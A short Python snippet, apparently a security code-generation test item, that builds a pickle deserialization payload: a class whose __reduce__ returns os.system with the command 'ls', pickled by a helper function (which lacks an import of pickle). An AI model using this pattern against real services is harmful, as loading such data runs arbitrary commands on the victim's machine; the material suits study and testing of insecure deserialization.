import os

class Payload(object):
    def __reduce__(self):
        return os.system, ('ls',)

def makePickleData(payload: Payload):
    '''
    Get serialized data from the payload object and serialize it before returning it
    '''
    serialized_payload = pickle.dumps(payload, protocol=0)
    return serialized_payload